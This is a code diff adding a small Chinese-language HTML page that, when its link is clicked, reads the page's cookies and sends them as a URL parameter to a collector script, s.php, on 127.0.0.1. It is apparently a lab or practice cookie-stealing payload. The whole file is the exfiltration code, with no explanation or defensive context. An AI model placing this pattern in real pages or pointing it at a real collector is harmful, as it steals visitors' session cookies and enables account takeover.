@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>发送Cookie到s.php</title>
+</head>
+<body>
+    <a href="#" id="sendCookieLink">点击这里发送Cookie到s.php</a>
+
+    <script>
+        document.getElementById('sendCookieLink').addEventListener('click', function(event) {
+            event.preventDefault(); // 阻止默认的链接跳转行为
+            var cookie = document.cookie; // 获取当前页面的cookie
+            var url = 'http://127.0.0.1/s.php?cookie=' + encodeURIComponent(cookie); // 构造目标URL
+            window.location.href = url; // 跳转到目标URL
+        });
+    </script>
+</body>
+</html>
